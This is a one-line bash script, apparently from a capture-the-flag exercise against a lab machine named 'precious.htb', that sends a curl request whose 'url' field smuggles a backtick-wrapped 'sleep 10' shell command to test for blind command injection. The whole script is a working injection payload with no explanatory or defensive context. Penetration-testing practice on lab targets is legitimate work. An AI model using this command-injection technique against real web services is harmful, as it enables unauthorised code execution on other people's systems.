#!/usr/bin/env bash

curl http://10.10.11.189/ -v -H 'Host: precious.htb' --data-urlencode 'url=http://%20`sleep 10`' --output -

